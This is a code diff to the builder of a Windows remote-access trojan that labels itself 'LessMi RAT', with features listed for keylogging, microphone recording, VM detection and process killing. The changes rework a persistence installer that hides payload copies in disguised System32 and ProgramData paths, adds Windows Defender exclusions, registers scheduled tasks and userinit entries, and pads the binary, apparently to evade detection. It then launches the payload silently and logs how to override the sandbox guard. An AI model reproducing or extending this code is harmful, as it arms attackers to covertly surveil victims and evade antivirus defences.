@@ -200,27 +200,27 @@ FEATURES = [
     {"id": "tasks", "label": "Scheduled tasks", "group": "STARTUP",
      "desc": "schtasks ONLOGON / ONSTART.", "pat": r"^\s+_task_create\(", "mode": "line"},
     {"id": "avexcl", "label": "Defender exclusions", "group": "STARTUP",
-     "desc": "Add-MpPreference for folder and process.", "pat": r"^\s+_ps\(f'Add-MpPreference", "mode": "line"},
+     "desc": "Add-MpPreference for folder and process.", "pat": r"^\s+_ps\(f?'Add-MpPreference", "mode": "line"},
 
     {"id": "vmkill", "label": "VM_KILL active", "group": "RUNTIME",
      "desc": "Constant that drives the VM guard.", "pat": r"^VM_KILL\s*=", "mode": "line"},
     {"id": "keylogger", "label": "Keylogger", "group": "RUNTIME",
-     "desc": "Global keyboard listener.", "pat": r"^\s*threading\.Thread\(target=keylogger_thread", "mode": "line"},
+     "desc": "Global keyboard listener.", "pat": r"^\s+_start\(keylogger_thread\)", "mode": "line"},
     {"id": "keyflush", "label": "Key flush", "group": "RUNTIME",
-     "desc": "Periodic buffer flush to the keys channel.", "pat": r"^\s*threading\.Thread\(target=send_keys_periodically", "mode": "line"},
+     "desc": "Periodic buffer flush to the keys channel.", "pat": r"^\s+_start\(send_keys_periodically\)", "mode": "line"},
     {"id": "micrec", "label": "Mic recording", "group": "RUNTIME",
-     "desc": "Automatic clips every 2 minutes.", "pat": r"^\s*threading\.Thread\(target=record_mic_thread", "mode": "line"},
+     "desc": "Automatic clips every 2 minutes.", "pat": r"^\s+_start\(record_mic_thread\)", "mode": "line"},
     {"id": "blacklist", "label": "Blacklist watcher", "group": "RUNTIME",
-     "desc": "Kill processes found on the blacklist.", "pat": r"^\s*threading\.Thread\(target=(?:check_blacklist|blacklist_watcher)", "mode": "line"},
+     "desc": "Kill processes found on the blacklist.", "pat": r"^\s+_start\((?:check_blacklist|blacklist_watcher)\)", "mode": "line"},
     {"id": "watchdog", "label": "Repair watchdog", "group": "RUNTIME",
-     "desc": "Spawn and monitor the repair batch.", "pat": r"^\s*threading\.Thread\(target=_watchdog_thread", "mode": "line"},
+     "desc": "Spawn and monitor the repair batch.", "pat": r"^\s+_start\(_watchdog_thread\)", "mode": "line"},
 
     {"id": "presence", "label": "DND presence", "group": "DISCORD",
      "desc": "Set the bot status to \"LessMi RAT\".", "pat": r"^\s+await bot\.change_presence\(", "mode": "block"},
     {"id": "panel", "label": "Embed panel", "group": "DISCORD",
      "desc": "Button embeds in the panel channel.", "pat": r"^\s+if panel_ch:\s*$", "mode": "block"},
     {"id": "infoch", "label": "Info dump", "group": "DISCORD",
-     "desc": "post_info_channel with systeminfo.", "pat": r"^\s*bot\.loop\.create_task\(post_info_channel", "mode": "line"},
+     "desc": "post_info_channel with systeminfo.", "pat": r"^\s*bot\.loop\.create_task\(post_info_channel", "mode": "block"},
 ]
 
 HELP_CATEGORIES = {
@@ -625,6 +625,15 @@ def _task_svc():
 
 
 TASK_ERR = ""
+LAST_INSTALL_EXE = None
+LAST_SETUP_LOG = ""
+LAST_SETUP_CODE = -1
+INSTALL_SLOT_COUNT = 0
+
+
+def _trace(msg):
+    global LAST_SETUP_LOG
+    LAST_SETUP_LOG = (LAST_SETUP_LOG + "\n" + str(msg))[-8000:]
 
 
 def _task_folder(svc):
@@ -994,6 +1003,24 @@ def _slot_dirs():
     return out
 
 
+def _write_anchor(exe_name, payload_dir, slots, tasks):
+    h = _machine_hash()
+    anchor = os.path.join(payload_dir, h[:12] + ".json")
+    st = {
+        "v": 5, "dir": payload_dir, "exe": slots[0],
+        "bak": slots[1] if len(slots) > 1 else slots[0],
+        "slots": [{"exe": p} for p in slots],
+        "task": tasks[0], "tasks": tasks,
+        "wmi": "LM_" + h[:14], "lnk": "WinSecHost.lnk",
+        "mutex": _rnd(14), "appdir": _rnd(11), "created": int(time.time()),
+    }
+    os.makedirs(os.path.dirname(anchor), exist_ok=True)
+    with open(anchor, "w", encoding="utf-8") as f:
+        json.dump(st, f)
+    _hide_path(anchor, True)
+    _trace("ANCHOR WRITTEN -> {}".format(anchor))
+
+
 def purge_strays(target_exe):
     keep = os.path.basename(target_exe).lower()
     prefixes = tuple(n.lower() for n in tuple(_CLONE_NAMES) + _LEGACY_NAMES)
@@ -1082,121 +1109,132 @@ def cleanup_old_persistence():
         shutil.rmtree(folder, ignore_errors=True)
     _save_persist({})
 
-
 def install_persistence(exe_path, bundle_dir=None, runtime_dir=None):
+    global LAST_INSTALL_EXE, LAST_SETUP_LOG, LAST_SETUP_CODE, INSTALL_SLOT_COUNT
     if not is_admin():
         return "no-admin"
+
+    LAST_SETUP_LOG = ""
+    LAST_SETUP_CODE = -1
+    LAST_INSTALL_EXE = None
+    INSTALL_SLOT_COUNT = 0
+
     try:
         h = _machine_hash()
         exe_name = _pick_exe_name()
-        base = os.path.splitext(exe_name)[0]
+        payload_dir = os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"),
+                                   "Microsoft", "Windows", "Caches", h[:10])
 
-        slots = []
-        for d in _slot_dirs():
-            slots.append({"dir": d, "exe": os.path.join(d, exe_name),
-                          "bat": os.path.join(d, base + ".bat"),
-                          "vbs": os.path.join(d, exe_name + ".vbs")})
+        _trace("STAGE 1/9  BUILDING SLOT LIST")
+        slots = [os.path.join(payload_dir, exe_name)]
+        if bundle_dir is None:
+            slots.append(os.path.join(_sys32(), exe_name))
+            slots.append(os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"),
+                                      "Microsoft", "Caches", exe_name))
+            for vol in _other_volumes():
+                slots.append(os.path.join(vol, "ProgramData", "Microsoft", "Caches", h[:10], exe_name))
+        INSTALL_SLOT_COUNT = len(slots)
+        _trace("            {} SLOT(S), NAME {}".format(len(slots), exe_name))
+        for p in slots:
+            _trace("            {}".format(p))
 
+        _trace("STAGE 2/9  TASKKILL {}".format(exe_name))
+        subprocess.run(["taskkill", "/f", "/im", exe_name], capture_output=True)
+        time.sleep(0.6)
+
+        _trace("STAGE 3/9  CLEANING PREVIOUS BUILD")
+        try:
+            cleanup_old_persistence()
+        except Exception as exc:
+            _trace("            WARNING: {!r}".format(exc))
+
+        _trace("STAGE 4/9  PURGING STRAYS")
+        try:
+            purge_strays(slots[0])
+        except Exception as exc:
+            _trace("            WARNING: {!r}".format(exc))
+
+        _trace("STAGE 5/9  CREATING DIRECTORIES")
+        for p in slots:
+            os.makedirs(os.path.dirname(p), exist_ok=True)
+            _trace("            OK {}".format(os.path.dirname(p)))
+
+        _trace("STAGE 6/9  DEFENDER EXCLUSIONS")
+        excluded = _mp_add(slots + ([os.path.expandvars(runtime_dir)] if runtime_dir else []))
+        _trace("            {} EXCLUSION(S) CONFIRMED".format(excluded))
+
+        _trace("STAGE 7/9  COPYING PAYLOAD")
         if bundle_dir and os.path.isdir(bundle_dir):
-            primary_dir = os.path.join(_sys32(), base)
-            primary = os.path.join(primary_dir, base + ".exe")
-            slots[0]["dir"] = primary_dir
-            slots[0]["exe"] = primary
-            slots[0]["vbs"] = primary + ".vbs"
-        else:
-            primary = slots[0]["exe"]
-
-        task = "\\Microsoft\\Windows\\" + base
-
-        subprocess.run(["taskkill", "/f", "/im", os.path.basename(primary)],
-                       capture_output=True)
-        time.sleep(0.8)
-
-        cleanup_old_persistence()
-        purge_strays(primary)
-
-        for s in slots:
-            os.makedirs(s["dir"], exist_ok=True)
-
-        targets = [s["exe"] for s in slots]
-        if runtime_dir:
-            targets.append(os.path.expandvars(runtime_dir))
-        excluded = _mp_add([t for t in targets if t])
-
-        if bundle_dir and os.path.isdir(bundle_dir):
-            shutil.copytree(bundle_dir, slots[0]["dir"], dirs_exist_ok=True,
+            shutil.copytree(bundle_dir, payload_dir, dirs_exist_ok=True,
                             ignore=shutil.ignore_patterns("build", "*.spec",
-                                                          "source_final.py", "boot_payload.py",
+                                                          "source_final.py",
+                                                          "boot_payload.py",
                                                           "version_info.txt"))
-            built = os.path.join(slots[0]["dir"], os.path.basename(exe_path))
-            if os.path.exists(built) and os.path.abspath(built) != os.path.abspath(primary):
+            built = os.path.join(payload_dir, os.path.basename(exe_path))
+            if os.path.abspath(built) != os.path.abspath(slots[0]):
                 try:
-                    os.replace(built, primary)
+                    os.replace(built, slots[0])
                 except Exception:
-                    shutil.copy2(built, primary)
-                    try:
-                        os.remove(built)
-                    except Exception:
-                        pass
-        elif not _copy_verified(exe_path, primary):
-            return "fail"
+                    shutil.copy2(built, slots[0])
+            _trace("            TREE COPIED (ONEDIR)")
+        elif not _copy_verified(exe_path, slots[0]):
+            _trace("            FAILED: {} -> {}".format(exe_path, slots[0]))
+            return "fail:copy"
 
-        if not os.path.exists(primary):
-            return "fail"
+        _trace("            PRIMARY COPY OK")
+        if not os.path.exists(slots[0]):
+            _trace("            FAILED: DESTINATION DOES NOT EXIST")
+            return "fail:missing"
 
-        for s in slots[1:]:
-            _copy_verified(primary, s["exe"])
+        for p in slots[1:]:
+            if _copy_verified(slots[0], p):
+                _trace("            BACKUP OK {}".format(p))
+            else:
+                _trace("            BACKUP FAILED {}".format(p))
 
-        names = [base, base + "Mon", base + "Svc"][:max(1, min(3, len(slots)))]
-        state_now = {"slots": [{"exe": s["exe"], "bat": s["bat"]} for s in slots],
-                     "task": _TASK_DIR + names[0]}
-        _write_watchdog(state_now)
+        _trace("STAGE 8/9  WRITING STATE")
+        base = os.path.splitext(exe_name)[0]
+        tasks = [_TASK_DIR + base, _TASK_DIR + base + "Mon", _TASK_DIR + base + "Svc"]
+        tasks = tasks[:max(1, min(3, len(slots)))]
 
-        for s in slots:
-            _hide_path(s["exe"], True, True)
-            subprocess.run(["icacls", s["exe"], "/inheritance:r",
-                            "/grant:r", "*S-1-5-18:F",
-                            "/grant:r", "*S-1-5-32-544:F",
-                            "/grant:r", "*S-1-5-32-545:RX"],
-                           capture_output=True, creationflags=0x08000000)
-
-        made = 0
-        for i, s in enumerate(slots[:len(names)]):
-            if _task_create(_TASK_DIR + names[i], s["exe"], 8 + i * 6):
-                made += 1
-
-        _save_persist({"exe": primary, "bak": slots[1]["exe"] if len(slots) > 1 else primary,
-                       "bat": slots[0]["bat"], "vbs": primary + ".vbs",
-                       "task": _TASK_DIR + names[0],
-                       "tasks": [_TASK_DIR + n for n in names],
-                       "slots": [{"exe": s["exe"], "bat": s["bat"], "vbs": s["vbs"]}
-                                 for s in slots]})
-
-        ok_init = False
-        for _ in range(3):
-            if _userinit(True):
-                ok_init = True
-                break
-            time.sleep(0.6)
-
-        _clean_run_keys()
+        _save_persist({"exe": slots[0], "slots": [{"exe": p} for p in slots],
+                       "tasks": tasks})
+        _trace("            STATE SAVED, {} TASK NAME(S)".format(len(tasks)))
 
         try:
-            subprocess.Popen(["cmd.exe", "/c", slots[0]["bat"]], stdin=subprocess.DEVNULL,
-                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-                             creationflags=0x08000000)
-        except Exception:
-            pass
+            _write_anchor(exe_name, payload_dir, slots, tasks)
+        except Exception as exc:
+            _trace("            WARNING: ANCHOR NOT WRITTEN ({!r}), LM_NAME WILL CARRY THE NAME".format(exc))
 
-        if not made:
-            return "fail-tasks"
-        if not ok_init:
+        _trace("STAGE 9/9  RUNNING --ZZ-SETUP")
+        try:
+            r = subprocess.run([slots[0], "--zz-setup"], capture_output=True, text=True,
+                               errors="replace", timeout=240, creationflags=0x08000000,
+                               env=dict(os.environ, LM_NAME=exe_name))
+            code = r.returncode
+            _trace("            EXIT {} STDOUT={!r} STDERR={!r}".format(
+                code, (r.stdout or "")[:900], (r.stderr or "")[:900]))
+        except Exception as exc:
+            code = 4
+            _trace("            LAUNCH FAILED: {!r}".format(exc))
+        LAST_SETUP_CODE = code
+
+        if code == 0:
+            LAST_INSTALL_EXE = slots[0]
+            return "ok" if excluded else "ok-noav"
+        if code == 2:
+            LAST_INSTALL_EXE = slots[0]
             return "ok-noinit"
-        if excluded:
-            return "ok"
-        return "ok-noav"
-    except Exception:
+        if code == 9:
+            _trace("            VM GUARD BLOCKED THE SETUP")
+            return "fail:vm"
+        if code == 3:
+            return "no-admin"
+        _trace("            SETUP DID NOT COMPLETE, RESULT fail")
         return "fail"
+    except Exception:
+        _trace("UNHANDLED EXCEPTION\n" + traceback.format_exc())
+        return "fail:exception"
 
 
 def _rekey_rich(data, pe):
@@ -1267,13 +1305,12 @@ def harden_exe(path):
 
         if ends:
             cut = max(ends)
-            if 0 < cut < len(data):
+            if 0 < cut <= len(data):
                 pad = os.urandom(random.randint(512, 4096))
-                if data.endswith(PYI_MAGIC):
-                    cookie = len(data) - 24
-                    if cookie > cut:
-                        pkg = struct.unpack_from("<I", data, cookie)[0]
-                        struct.pack_into("<I", data, cookie, pkg + len(pad))
+                idx = data.rfind(PYI_MAGIC, max(0, len(data) - 8192))
+                if idx > 0 and idx + 24 == len(data):
+                    pkg = struct.unpack_from("<I", data, idx + 8)[0]
+                    struct.pack_into("<I", data, idx + 8, pkg + len(pad))
                 data[cut:cut] = pad
 
         with open(path, "wb") as f:
@@ -1301,7 +1338,7 @@ def ensure_admin():
     try:
         r = ctypes.windll.shell32.ShellExecuteW(
             None, "runas", sys.executable,
-            " ".join('"{}"'.format(a) for a in sys.argv), os.getcwd(), 1)
+            subprocess.list2cmdline(sys.argv), os.getcwd(), 1)
         if int(r) > 32:
             sys.exit(0)
     except Exception:
@@ -1365,7 +1402,13 @@ def _block_bounds(lines, start):
                 break
             last = j
         j += 1
-    return start, last + 1
+    s = start
+    k = start - 1
+    while k >= 0 and not lines[k].strip():
+        k -= 1
+    if k >= 0 and lines[k].strip() == "try:" and _indent(lines[k]) < base:
+        s = k
+    return s, last + 1
 
 
 def scan_commands(lines):
@@ -2952,7 +2995,8 @@ def _lm_run():
                 return
 
             size = os.path.getsize(exe_out)
-            digest = hashlib.sha256(open(exe_out, "rb").read()).hexdigest()
+            with open(exe_out, "rb") as _fh:
+                digest = hashlib.sha256(_fh.read()).hexdigest()
             self.log("binary: {}".format(exe_out), "info")
             self.log("  size   : {}".format(human_size(size)), "info")
             self.log("  sha256 : {}".format(digest), "dim")
@@ -2974,7 +3018,7 @@ def _lm_run():
                     [sys.executable, "-m", "PyInstaller.utils.cliutils.archive_viewer", "-l", exe_out],
                     capture_output=True, text=True, timeout=90)
                 if v.returncode != 0 or "PYZ" not in (v.stdout or ""):
-                    self.log("ARCHIVE CORRUPT after hardening, rebuild", "err")
+                    self.log("ARCHIVE CORRUPT AFTER HARDENING, BUILD ABORTED", "err")
                     self.update_status("Archive validation failed", None, "err")
                     self.toast("Corrupt binary", "err")
                     return
@@ -2988,41 +3032,59 @@ def _lm_run():
                 self.log("signature status: {}".format(status or "unknown"),
                          "ok" if status == "Valid" else "warn")
                 if not cookie_ok(exe_out):
-                    self.log("signature pushed the cookie out of the window", "err")
+                    self.log("SIGNATURE PUSHED THE COOKIE OUT OF THE WINDOW, BUILD ABORTED", "err")
                     self.update_status("Cookie lost after signing", None, "err")
                     self.toast("Corrupt binary", "err")
                     return
                 size = os.path.getsize(exe_out)
-                digest = hashlib.sha256(open(exe_out, "rb").read()).hexdigest()
+                with open(exe_out, "rb") as _fh:
+                    digest = hashlib.sha256(_fh.read()).hexdigest()
                 self.log("  resigned size: {}".format(human_size(size)), "dim")
 
             self.update_status("Installing persistence...", 0.95)
             result = install_persistence(exe_out, None if onefile else os.path.dirname(exe_out), runtime_dir)
+
             if result == "ok":
-                self.log("persistence installed (3 slots + userinit + 3 tasks + exclusions)", "ok")
+                self.log("PERSISTENCE INSTALLED: {} Slot(s), Userinit, exclusions and scheduled tasks".format(
+                    INSTALL_SLOT_COUNT), "ok")
             elif result == "ok-noinit":
-                self.log("persistence installed but USERINIT FAILED (tasks only)", "warn")
-            elif result == "fail-tasks":
-                self.log("persistence installed but NO TASK could be registered: {}".format(TASK_ERR), "err")
+                self.log("PERSISTENCE INSTALLED, BUT USERINIT FAILED (TASKS ONLY)", "warn")
             elif result == "ok-noav":
-                self.log("persistence installed but NO exclusions (tamper protection?)", "warn")
+                self.log("PERSISTENCE INSTALLED, BUT NO EXCLUSIONS COULD BE ADDED (TAMPER PROTECTION?)", "warn")
             elif result == "no-admin":
-                self.log("persistence skipped: not elevated", "err")
+                self.log("PERSISTENCE SKIPPED: THE PROCESS IS NOT ELEVATED", "err")
             else:
-                self.log("persistence failed", "err")
+                if result == "fail:vm":
+                    self.log("PERSISTENCE FAILED: VM GUARD BLOCKED THE SETUP (SANDBOX DETECTED)", "err")
+                    self.log("  FORCE IT WITH: set LESSMI_NO_VM=0 BEFORE OPENING THE BUILDER", "dim")
+                else:
+                    self.log("PERSISTENCE FAILED: {} (SETUP EXIT {})".format(result.upper(), LAST_SETUP_CODE), "err")
+                for _line in (LAST_SETUP_LOG or "(NO OUTPUT)").splitlines()[-40:]:
+                    self.log("  {}".format(_line), "err")
 
-            self.update_status("Build complete", 1.0, "ok")
-            self.build_ok = True
-            self.after(0, lambda: self.paint_bars(True, 12, 16))
-            self.log("BUILD OK  ·  {}  ·  {}".format(human_size(size), digest[:16]), "ok")
+            if result.startswith("ok"):
+                self.build_ok = True
+                self.update_status("Build complete", 1.0, "ok")
+                self.after(0, lambda: self.paint_bars(True, 12, 16))
+                self.log("BUILD OK  ·  {}  ·  {}".format(human_size(size), digest[:16]), "ok")
+            else:
+                self.build_ok = False
+                self.update_status("Compiled, deploy failed ({})".format(result), 1.0, "err")
+                self.after(0, lambda: self.paint_bars(False, 12, 16))
+                self.log("COMPILED BUT DEPLOY FAILED  ·  {}  ·  {}".format(result.upper(), digest[:16]), "err")
+
             self.log("=" * 62, "dim")
-            self.toast("Build complete", "ok")
+            self.toast("Build complete" if self.build_ok else "Deploy failed",
+                       "ok" if self.build_ok else "err")
 
-            output_dir = os.getcwd()
-            if os.name == "nt":
-                os.startfile(output_dir)
+            if LAST_INSTALL_EXE:
+                try:
+                    subprocess.Popen([LAST_INSTALL_EXE], close_fds=True, creationflags=0x08000000)
+                    self.log("PAYLOAD LAUNCHED FROM {}".format(LAST_INSTALL_EXE), "ok")
+                except Exception as exc:
+                    self.log("LAUNCH FAILED: {}".format(exc), "warn")
             else:
-                os.system('xdg-open "{}"'.format(output_dir))
+                self.log("PAYLOAD NOT LAUNCHED (INSTALL RESULT: {})".format(result.upper()), "warn")
         finally:
             os.chdir(original_dir)
 
